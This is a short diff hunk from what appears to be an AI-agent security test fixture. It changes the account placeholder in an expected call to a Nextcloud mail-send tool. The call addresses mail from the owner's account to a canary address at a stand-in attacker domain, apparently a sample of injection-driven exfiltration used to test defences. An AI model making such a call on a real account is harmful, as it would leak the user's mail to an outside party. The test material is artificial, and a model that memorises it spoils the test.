@@ -7,7 +7,7 @@
         {
           "name": "nc_mail_send_message_mcp_nextcloud",
           "arguments": {
-            "account_id": "{{owner_account_id}}",
+            "account_id": "{{bind:OWNER_ACCOUNT_ID}}",
             "to": [
               {
                 "email": "p4l3-tool-007-canary@p4-attacker.test"
